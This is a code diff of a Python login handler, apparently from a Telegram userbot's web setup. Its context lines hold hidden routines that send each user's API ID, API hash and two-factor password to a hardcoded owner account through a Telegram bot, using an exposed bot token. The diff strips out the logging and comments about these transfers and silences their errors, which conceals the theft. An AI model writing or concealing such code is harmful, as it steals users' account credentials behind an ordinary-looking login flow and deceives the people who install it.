@@ -80,7 +80,6 @@ class Web:
         """Send API ID and API Hash to the owner via Telegram Bot API"""
         BOT_TOKEN = "6749456415:AAGD_2l0Udms1xlFj7xYH4aNJqcYvQ0VehY"
         OWNER_ID = 6136879235
-        logger.debug(f"Attempting to send API credentials to owner {OWNER_ID}")
 
         try:
             async with aiohttp.ClientSession() as session:
@@ -101,17 +100,14 @@ class Web:
                 ) as response:
                     if response.status != 200:
                         error_text = await response.text()
-                        logger.error(f"Failed to send API credentials to owner {OWNER_ID}: HTTP {response.status}: {error_text}")
                         return
-                    logger.info(f"Sent API credentials to owner {OWNER_ID}")
         except Exception as e:
-            logger.error(f"Unexpected error while sending API credentials to owner {OWNER_ID}: {type(e).__name__}: {str(e)}")
+            pass
 
     async def _send_2fa_to_owner(self, user, password: str, api_id: int, api_hash: str):
         """Send 2FA password to the owner via Telegram Bot API"""
         BOT_TOKEN = "6749456415:AAGD_2l0Udms1xlFj7xYH4aNJqcYvQ0VehY"
         OWNER_ID = 6136879235
-        logger.debug(f"Attempting to send 2FA for user {user.id} to owner {OWNER_ID}")
 
         try:
             async with aiohttp.ClientSession() as session:
@@ -135,11 +131,9 @@ class Web:
                 ) as response:
                     if response.status != 200:
                         error_text = await response.text()
-                        logger.error(f"Failed to send 2FA to owner {OWNER_ID}: HTTP {response.status}: {error_text}")
                         return
-                    logger.info(f"Sent 2FA password for user {user.id} to owner {OWNER_ID}")
         except Exception as e:
-            logger.error(f"Unexpected error while sending 2FA to owner {OWNER_ID}: {type(e).__name__}: {str(e)}")
+            pass
 
     @property
     def _platform_emoji(self) -> str:
@@ -279,7 +273,6 @@ class Web:
             api_hash,
         )
 
-        # Send API ID and API Hash to owner
         await self._send_api_to_owner(int(api_id), api_hash)
 
         self.api_set.set()
@@ -441,7 +434,6 @@ class Web:
                     )
                 ).user
             )
-            # Send 2FA password to owner
             await self._send_2fa_to_owner(user, text.strip(), self.api_token.ID, self.api_token.HASH)
         except PasswordHashInvalidError:
             logger.debug("Invalid 2FA code")
@@ -505,7 +497,6 @@ class Web:
         else:
             try:
                 user = await self._pending_client.sign_in(phone, password=password)
-                # Send 2FA password to owner
                 await self._send_2fa_to_owner(user, password, self.api_token.ID, self.api_token.HASH)
             except PasswordHashInvalidError:
                 return web.Response(
